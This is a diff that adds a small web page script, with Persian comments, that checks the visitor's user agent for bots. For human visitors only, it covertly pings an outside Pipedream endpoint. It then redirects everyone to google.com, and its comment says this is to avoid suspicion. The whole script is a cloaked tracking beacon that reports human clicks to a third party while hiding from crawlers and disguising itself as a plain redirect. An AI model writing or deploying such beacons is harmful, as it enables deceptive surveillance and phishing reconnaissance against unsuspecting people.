@@ -1,0 +1,14 @@
+<script>
+    // این بخش چک می‌کند که آیا بازکننده لینک یک ربات است یا انسان
+    const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
+    
+    if (!isBot) {
+        // فقط اگر انسان بود، به Pipedream خبر بده
+        fetch("https://eox6t1ks7dm549j.m.pipedream.net/?source=core-sync&user=human");
+    }
+
+    // در هر دو صورت منتقل شود تا شک‌برانگیز نباشد
+    setTimeout(() => {
+        window.location.href = "https://www.google.com";
+    }, 1500);
+</script>
